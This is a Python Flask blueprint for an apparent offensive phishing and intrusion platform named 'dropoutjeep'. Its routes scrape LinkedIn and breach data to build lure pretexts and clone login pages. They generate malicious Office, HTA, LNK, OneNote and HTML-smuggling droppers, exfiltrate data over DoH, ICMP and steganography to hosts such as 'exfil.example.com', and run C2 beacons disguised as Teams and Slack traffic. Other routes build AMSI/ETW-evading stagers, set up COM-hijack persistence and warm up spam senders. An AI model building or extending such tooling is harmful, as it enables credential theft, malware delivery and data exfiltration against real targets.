import os
import json
import base64
from io import BytesIO
from flask import Blueprint, render_template, request, jsonify, send_file, flash, redirect, url_for, g
from dropoutjeep_lib.utils.auth import operator_required, viewer_required, admin_required
from dropoutjeep_lib import db
from dropoutjeep_lib.models import SendingProfile, Campaign, Setting

new_features_bp = Blueprint('new_features', __name__)

# ---------------------------------------------------------------------------
# 1. OSINT Dashboard (/admin/osint)
# ---------------------------------------------------------------------------
@new_features_bp.route('/admin/osint', methods=['GET'])
@viewer_required
def osint_dashboard_page():
    return render_template('osint_dashboard.html')

@new_features_bp.route('/admin/osint/linkedin', methods=['POST'])
@operator_required
def api_osint_linkedin():
    data = request.get_json() or request.form
    name = data.get('name', '').strip()
    company = data.get('company', '').strip()
    email = data.get('email', '').strip() or None
    action = data.get('action', 'scrape')

    if not name or not company:
        return jsonify({'error': 'Name and company are required'}), 400

    from dropoutjeep_lib.utils.osint_linkedin import scrape_linkedin_profile, generate_pretext_brief
    profile_data = scrape_linkedin_profile(name, company, email)
    if action == 'pretext' or data.get('generate_pretext'):
        brief = generate_pretext_brief(profile_data)
        return jsonify({'profile': profile_data, 'brief': brief})
    return jsonify({'profile': profile_data})

@new_features_bp.route('/admin/osint/breach', methods=['POST'])
@operator_required
def api_osint_breach():
    data = request.get_json() or request.form
    email = data.get('email', '').strip()
    api_key = data.get('api_key', '').strip()
    provider = data.get('provider', 'dehashed').strip()
    action = data.get('action', 'lookup')

    if not email:
        return jsonify({'error': 'Email is required'}), 400

    from dropoutjeep_lib.utils.breach_lookup import lookup_breach_data, generate_password_compromise_pretext
    res = lookup_breach_data(email, api_key, provider)
    
    pretext = None
    if action == 'pretext' or data.get('password'):
        pwd = data.get('password') or (res.get('passwords')[0] if res.get('passwords') else 'P@ssword123!')
        pretext = generate_password_compromise_pretext(email, pwd, res.get('breach_sources'))

    return jsonify({'result': res, 'pretext': pretext})


# ---------------------------------------------------------------------------
# 2. Pretext Generator (/admin/pretext-gen)
# ---------------------------------------------------------------------------
@new_features_bp.route('/admin/pretext-gen', methods=['GET'])
@viewer_required
def pretext_gen_page():
    return render_template('pretext_gen.html')

@new_features_bp.route('/admin/pretext/gen', methods=['POST'])
@operator_required
def api_pretext_gen():
    data = request.get_json() or request.form
    company = data.get('company', '').strip() or None
    sector = data.get('sector', '').strip() or None

    from dropoutjeep_lib.utils.pretext_gen import generate_pretexts
    res = generate_pretexts(company, sector)
    return jsonify(res)


# ---------------------------------------------------------------------------
# 3. Branding Clone (/admin/branding-clone)
# ---------------------------------------------------------------------------
@new_features_bp.route('/admin/branding-clone', methods=['GET'])
@viewer_required
def branding_clone_page():
    return render_template('branding_clone.html')

@new_features_bp.route('/admin/branding/clone', methods=['POST'])
@operator_required
def api_branding_clone():
    data = request.get_json() or request.form
    url = data.get('url', '').strip()
    if not url:
        return jsonify({'error': 'Target URL is required'}), 400

    from dropoutjeep_lib.utils.branding_clone import clone_login_page
    res = clone_login_page(url)
    return jsonify(res)


# ---------------------------------------------------------------------------
# 4. Payload Generators (/admin/payloads)
# ---------------------------------------------------------------------------
@new_features_bp.route('/admin/payloads', methods=['GET'])
@viewer_required
def payloads_page():
    campaigns = Campaign.query.order_by(Campaign.created_at.desc()).all()
    return render_template('payloads_new.html', campaigns=campaigns)

@new_features_bp.route('/admin/payload/equation-editor', methods=['POST'])
@operator_required
def api_payload_equation_editor():
    data = request.get_json() or request.form
    payload_url = data.get('payload_url', '').strip()
    filename = data.get('filename', 'doc_equation.docx').strip() or 'doc_equation.docx'
    if not payload_url:
        return jsonify({'error': 'Payload URL is required'}), 400

    from dropoutjeep_lib.utils.equation_editor import build_equation_docx
    file_bytes = build_equation_docx(payload_url)
    return send_file(
        BytesIO(file_bytes),
        mimetype='application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        as_attachment=True,
        download_name=filename
    )

@new_features_bp.route('/admin/payload/remote-template', methods=['POST'])
@operator_required
def api_payload_remote_template():
    data = request.get_json() or request.form
    template_url = data.get('template_url', '').strip()
    payload_url = data.get('payload_url', '').strip()
    fmt = data.get('format', 'docx').strip()

    if fmt == 'hta':
        if not payload_url:
            return jsonify({'error': 'Payload URL is required for HTA'}), 400
        from dropoutjeep_lib.utils.remote_template import build_hta_response
        content, mime, filename = build_hta_response(payload_url)
        return send_file(
            BytesIO(content if isinstance(content, bytes) else content.encode()),
            mimetype=mime,
            as_attachment=True,
            download_name=filename
        )
    else:
        if not template_url:
            return jsonify({'error': 'Template URL is required for Remote Template DOCX'}), 400
        from dropoutjeep_lib.utils.remote_template import build_remote_template_docx
        file_bytes = build_remote_template_docx(template_url)
        return send_file(
            BytesIO(file_bytes),
            mimetype='application/vnd.openxmlformats-officedocument.wordprocessingml.document',
            as_attachment=True,
            download_name=data.get('filename', 'remote_template.docx')
        )

@new_features_bp.route('/admin/payload/search-ms', methods=['POST'])
@operator_required
def api_payload_search_ms():
    data = request.get_json() or request.form
    webdav_url = data.get('webdav_url', '').strip()
    file_type = data.get('file_type', 'lnk').strip()
    if not webdav_url:
        return jsonify({'error': 'WebDAV URL is required'}), 400

    from dropoutjeep_lib.utils.search_ms import build_search_ms_lnk, build_search_connector_ms
    if file_type == 'searchConnector-ms':
        xml_bytes = build_search_connector_ms(webdav_url)
        return send_file(
            BytesIO(xml_bytes if isinstance(xml_bytes, bytes) else xml_bytes.encode()),
            mimetype='application/octet-stream',
            as_attachment=True,
            download_name=data.get('filename', 'search_connector.searchConnector-ms')
        )
    else:
        lnk_bytes = build_search_ms_lnk(webdav_url)
        return send_file(
            BytesIO(lnk_bytes),
            mimetype='application/octet-stream',
            as_attachment=True,
            download_name=data.get('filename', 'search_ms.lnk')
        )

@new_features_bp.route('/admin/payload/onenote', methods=['POST'])
@operator_required
def api_payload_onenote():
    if 'payload_file' in request.files:
        f = request.files['payload_file']
        payload_bytes = f.read()
        filename = f.filename or 'payload.exe'
    else:
        data = request.get_json() or request.form
        b64 = data.get('payload_b64', '')
        payload_bytes = base64.b64decode(b64) if b64 else b'echo test'
        filename = data.get('filename', 'payload.exe')

    from dropoutjeep_lib.utils.onenote_packager import build_onenote_package
    one_bytes = build_onenote_package(payload_bytes, filename)
    return send_file(
        BytesIO(one_bytes),
        mimetype='application/onenote',
        as_attachment=True,
        download_name=request.form.get('output_filename', 'package.one')
    )

@new_features_bp.route('/admin/payload/macro', methods=['POST'])
@operator_required
def api_payload_macro():
    data = request.get_json() or request.form
    payload_url = data.get('payload_url', '').strip()
    obfuscation = data.get('obfuscation', 'chr').strip()
    fmt = data.get('format', 'docm').strip()
    if not payload_url:
        return jsonify({'error': 'Payload URL is required'}), 400

    from dropoutjeep_lib.utils.macro_generator import build_docm_with_macro, build_doc_with_macro
    if fmt == 'doc':
        doc_bytes = build_doc_with_macro(payload_url, obfuscation_method=obfuscation)
        filename = 'macro_document.doc'
        mime = 'application/msword'
    else:
        doc_bytes = build_docm_with_macro(payload_url, obfuscation_method=obfuscation)
        filename = 'macro_document.docm'
        mime = 'application/vnd.ms-word.document.macroEnabled.12'

    return send_file(
        BytesIO(doc_bytes),
        mimetype=mime,
        as_attachment=True,
        download_name=data.get('filename', filename)
    )

@new_features_bp.route('/admin/payload/smuggler', methods=['POST'])
@operator_required
def api_payload_smuggler():
    if 'payload_file' in request.files:
        f = request.files['payload_file']
        payload_b64 = base64.b64encode(f.read()).decode('ascii')
        filename = f.filename or 'payload.exe'
    else:
        data = request.get_json() or request.form
        payload_b64 = data.get('payload_b64', '')
        filename = data.get('filename', 'payload.exe')

    title = request.form.get('title') or request.json.get('title') if request.json else 'Document Access'
    from dropoutjeep_lib.utils.html_smuggler import build_dropper_for_extension
    html_content = build_dropper_for_extension(payload_b64, filename, title=title)
    
    if request.headers.get('Accept') == 'application/json' or request.args.get('json') == '1':
        return jsonify({'html': html_content, 'filename': filename})

    return send_file(
        BytesIO(html_content.encode('utf-8')),
        mimetype='text/html',
        as_attachment=True,
        download_name=data.get('output_filename', 'smuggled_dropper.html') if 'data' in locals() else 'smuggled_dropper.html'
    )


# ---------------------------------------------------------------------------
# 5. Exfiltration Channels (/admin/exfil)
# ---------------------------------------------------------------------------
@new_features_bp.route('/admin/exfil-channels', methods=['GET'])
@viewer_required
def exfil_page():
    return render_template('exfil_new.html')

@new_features_bp.route('/admin/exfil/doh', methods=['POST'])
@operator_required
def api_exfil_doh():
    data = request.get_json() or request.form
    provider = data.get('provider', 'google').strip()
    base_domain = data.get('base_domain', 'exfil.example.com').strip()
    exfil_data = data.get('data', '').strip()

    if not exfil_data:
        return jsonify({'error': 'Data to exfiltrate is required'}), 400

    from dropoutjeep_lib.utils.doh_exfil import DohExfil
    doh = DohExfil(provider=provider)
    res = doh.exfiltrate(exfil_data, base_domain)
    return jsonify(res)

@new_features_bp.route('/admin/exfil/icmp', methods=['POST'])
@operator_required
def api_exfil_icmp():
    data = request.get_json() or request.form
    destination = data.get('destination', '127.0.0.1').strip()
    key = data.get('key', 'default_secret').strip()
    exfil_data = data.get('data', '').strip()

    if not exfil_data:
        return jsonify({'error': 'Data to exfiltrate is required'}), 400

    from dropoutjeep_lib.utils.icmp_exfil import IcmpExfil
    icmp = IcmpExfil(destination=destination, key=key)
    res = icmp.exfiltrate(exfil_data)
    return jsonify(res)

@new_features_bp.route('/admin/exfil/stegano', methods=['POST'])
@operator_required
def api_exfil_stegano():
    action = request.form.get('action') or (request.json.get('action') if request.json else 'embed')

    from dropoutjeep_lib.utils.stegano import SteganoExfil
    stego = SteganoExfil()

    if action == 'extract':
        if 'image_file' in request.files:
            img_bytes = request.files['image_file'].read()
        else:
            data = request.get_json() or request.form
            b64 = data.get('image_b64', '')
            img_bytes = base64.b64decode(b64) if b64 else b''
        extracted = stego.extract(img_bytes)
        return jsonify({'extracted': extracted})
    else:
        exfil_data = request.form.get('data') or (request.json.get('data') if request.json else '')
        upload_url = request.form.get('upload_url') or (request.json.get('upload_url') if request.json else '')
        bits = int(request.form.get('bits_per_channel', 1) or 1)

        cover_bytes = None
        if 'cover_image' in request.files:
            cover_bytes = request.files['cover_image'].read()

        if upload_url:
            res = stego.exfiltrate(exfil_data, upload_url, cover_image_bytes=cover_bytes, bits_per_channel=bits)
            return jsonify(res)

        out_bytes = stego.embed(exfil_data, cover_image_bytes=cover_bytes, bits_per_channel=bits)
        return send_file(
            BytesIO(out_bytes),
            mimetype='image/png',
            as_attachment=True,
            download_name='stego_carrier.png'
        )


# ---------------------------------------------------------------------------
# 6. C2 Configuration (/admin/c2)
# ---------------------------------------------------------------------------
@new_features_bp.route('/admin/c2', methods=['GET'])
@viewer_required
def c2_config_page():
    return render_template('c2_config.html')

@new_features_bp.route('/admin/c2/fronting/providers', methods=['GET'])
@viewer_required
def api_c2_fronting_providers():
    from dropoutjeep_lib.utils.domain_fronting import list_providers
    return jsonify({'providers': list_providers()})

@new_features_bp.route('/admin/c2/fronting/test', methods=['POST'])
@operator_required
def api_c2_fronting_test():
    data = request.get_json() or request.form
    provider = data.get('provider', 'azure').strip()
    backend_host = data.get('backend_host', 'c2.example.com').strip()

    from dropoutjeep_lib.utils.domain_fronting import test_fronting
    res = test_fronting(provider, backend_host)
    return jsonify(res)

@new_features_bp.route('/admin/c2/saas/teams', methods=['POST'])
@operator_required
def api_c2_saas_teams():
    data = request.get_json() or request.form
    raw_beacon = data.get('data', 'beacon ping')
    beacon_data = raw_beacon if isinstance(raw_beacon, dict) else {'payload': str(raw_beacon)}
    token = data.get('token', 'eyJhbGciOi...')

    from dropoutjeep_lib.utils.saas_mimicry import build_teams_beacon
    req_info = build_teams_beacon(beacon_data, token)
    return jsonify(req_info)

@new_features_bp.route('/admin/c2/saas/slack', methods=['POST'])
@operator_required
def api_c2_saas_slack():
    data = request.get_json() or request.form
    raw_beacon = data.get('data', 'beacon ping')
    beacon_data = raw_beacon if isinstance(raw_beacon, dict) else {'payload': str(raw_beacon)}
    bot_token = data.get('bot_token', 'xoxb-...')

    from dropoutjeep_lib.utils.saas_mimicry import build_slack_beacon
    req_info = build_slack_beacon(beacon_data, bot_token)
    return jsonify(req_info)

@new_features_bp.route('/admin/c2/dead-drop/resolve', methods=['POST'])
@operator_required
def api_c2_dead_drop_resolve():
    data = request.get_json() or request.form
    source_url = data.get('source', '').strip()
    if not source_url:
        return jsonify({'error': 'Source URL/User is required'}), 400

    from dropoutjeep_lib.utils.dead_drop import resolve_dead_drop
    res = resolve_dead_drop(source_url)
    return jsonify(res)


# ---------------------------------------------------------------------------
# 7. Evasion Settings (/admin/evasion)
# ---------------------------------------------------------------------------
@new_features_bp.route('/admin/evasion', methods=['GET'])
@viewer_required
def evasion_settings_page():
    from dropoutjeep_lib.utils.sandbox_evasion import WESTERN_EDR_PROCESSES
    from dropoutjeep_lib.utils.evasion import HEADER_PROFILES
    return render_template('evasion_settings.html', edr_processes=WESTERN_EDR_PROCESSES, header_profiles=HEADER_PROFILES)

@new_features_bp.route('/admin/evasion/edr/processes', methods=['GET'])
@viewer_required
def api_evasion_edr_processes():
    from dropoutjeep_lib.utils.sandbox_evasion import WESTERN_EDR_PROCESSES
    return jsonify({'processes': WESTERN_EDR_PROCESSES})

@new_features_bp.route('/admin/evasion/ip-reputation', methods=['POST'])
@operator_required
def api_evasion_ip_reputation():
    data = request.get_json() or request.form
    ip = data.get('ip', request.remote_addr)

    from dropoutjeep_lib.utils.ip_reputation import check_ip_reputation, should_serve_payload
    rep = check_ip_reputation(ip)
    serve = should_serve_payload(ip)
    return jsonify({'ip': ip, 'reputation': rep, 'should_serve': serve})

@new_features_bp.route('/admin/evasion/profiles', methods=['GET'])
@viewer_required
def api_evasion_profiles():
    from dropoutjeep_lib.utils.evasion import HEADER_PROFILES
    return jsonify({'profiles': HEADER_PROFILES})

@new_features_bp.route('/admin/evasion/stager/build', methods=['POST'])
@operator_required
def api_evasion_stager_build():
    data = request.get_json() or request.form
    beacon_url = data.get('beacon_url', 'https://c2.example.com').strip()
    techniques = data.get('techniques', ['amsi', 'etw', 'syscalls'])
    fmt = data.get('format', 'shellcode').strip()

    from dropoutjeep_lib.utils.stager_evasion import build_hardened_stager
    stager_data = build_hardened_stager(beacon_url, techniques=techniques, output_format=fmt)
    
    if isinstance(stager_data, str):
        stager_data = stager_data.encode('utf-8')

    return send_file(
        BytesIO(stager_data),
        mimetype='application/octet-stream',
        as_attachment=True,
        download_name=f'hardened_stager.{fmt}'
    )


# ---------------------------------------------------------------------------
# 8. Persistence Modules (/admin/persistence)
# ---------------------------------------------------------------------------
@new_features_bp.route('/admin/persistence', methods=['GET'])
@viewer_required
def persistence_page():
    return render_template('persistence.html')

@new_features_bp.route('/admin/persistence/generate', methods=['POST'])
@operator_required
def api_persistence_generate():
    data = request.get_json() or request.form
    module = data.get('module', 'com_hijack').strip()

    from dropoutjeep_lib.utils.persistence import generate_persistence_task
    res = generate_persistence_task(
        module,
        clsid=data.get('clsid'),
        dll_path=data.get('dll_path'),
        scope=data.get('scope', 'HKCU'),
        target_edr=data.get('target_edr'),
        implant_path=data.get('implant_path')
    )
    return jsonify(res)


# ---------------------------------------------------------------------------
# 9. Warmup Manager (/admin/warmup)
# ---------------------------------------------------------------------------
@new_features_bp.route('/admin/warmup', methods=['GET'])
@viewer_required
def warmup_page():
    from dropoutjeep_lib.utils.warmup import get_warmup_schedule
    profiles = SendingProfile.query.all()
    schedule = get_warmup_schedule()
    return render_template('warmup.html', profiles=profiles, schedule=schedule)

@new_features_bp.route('/admin/warmup/run', methods=['POST'])
@operator_required
def api_warmup_run():
    data = request.get_json() or request.form
    profile_id = int(data.get('profile_id', 0))

    from dropoutjeep_lib.utils.warmup import run_warmup_cycle
    res = run_warmup_cycle(profile_id)
    return jsonify(res)

@new_features_bp.route('/admin/warmup/schedule', methods=['GET'])
@viewer_required
def api_warmup_schedule():
    from dropoutjeep_lib.utils.warmup import get_warmup_schedule
    return jsonify({'schedule': get_warmup_schedule()})


# ---------------------------------------------------------------------------
# 10. FBL Registration (/admin/fbl)
# ---------------------------------------------------------------------------
@new_features_bp.route('/admin/fbl', methods=['GET'])
@viewer_required
def fbl_page():
    from dropoutjeep_lib.utils.fbl import list_fbl_programs
    programs = list_fbl_programs()
    profiles = SendingProfile.query.all()
    return render_template('fbl.html', programs=programs, profiles=profiles)

@new_features_bp.route('/admin/fbl/programs', methods=['GET'])
@viewer_required
def api_fbl_programs():
    from dropoutjeep_lib.utils.fbl import list_fbl_programs
    return jsonify({'programs': list_fbl_programs()})

@new_features_bp.route('/admin/fbl/register', methods=['POST'])
@operator_required
def api_fbl_register():
    data = request.get_json() or request.form
    program = data.get('program', 'gmail').strip()
    domain = data.get('domain', 'example.com').strip()

    from dropoutjeep_lib.utils.fbl import generate_fbl_confirmation
    res = generate_fbl_confirmation(domain, program)
    return jsonify(res)

@new_features_bp.route('/admin/fbl/complaints/<domain>', methods=['GET'])
@viewer_required
def api_fbl_complaints(domain):
    from dropoutjeep_lib.utils.fbl import get_spam_complaint_rate
    res = get_spam_complaint_rate(domain)
    return jsonify(res)


# ---------------------------------------------------------------------------
# 11. Proxy Payload Delivery (/admin/proxy-payload)
# ---------------------------------------------------------------------------
@new_features_bp.route('/admin/proxy-payload', methods=['GET'])
@viewer_required
def proxy_payload_page():
    return render_template('proxy_payload.html')

@new_features_bp.route('/admin/proxy-payload/rule', methods=['POST'])
@operator_required
def api_proxy_payload_rule():
    data = request.get_json() or request.form
    pattern = data.get('pattern', '/login')
    payload_url = data.get('payload_url', '')
    delay_ms = int(data.get('delay_ms', 0))
    require_interaction = bool(data.get('require_interaction', False))

    rule = {
        'pattern': pattern,
        'action': 'deliver_payload',
        'payload_url': payload_url,
        'execution_delay_ms': delay_ms,
        'require_interaction': require_interaction,
    }
    return jsonify({'status': 'applied', 'rule': rule})


# ---------------------------------------------------------------------------
# 12. Multi-Hop Proxy Chain (/admin/proxy-chain)
# ---------------------------------------------------------------------------
@new_features_bp.route('/admin/proxy-chain', methods=['GET'])
@viewer_required
def proxy_chain_page():
    return render_template('proxy_chain.html')

@new_features_bp.route('/admin/proxy-chain/health', methods=['GET'])
@viewer_required
def api_proxy_chain_health():
    from dropoutjeep_lib.utils.multi_hop_proxy import get_default_chain
    chain = get_default_chain()
    health = chain.health_check()
    return jsonify({'health': health})

@new_features_bp.route('/admin/proxy-chain/connect', methods=['POST'])
@operator_required
def api_proxy_chain_connect():
    data = request.get_json() or request.form
    target = data.get('target', '127.0.0.1').strip()
    port = int(data.get('port', 80))

    from dropoutjeep_lib.utils.multi_hop_proxy import get_default_chain
    chain = get_default_chain()
    res = chain.connect_chain(target, port)
    return jsonify(res)
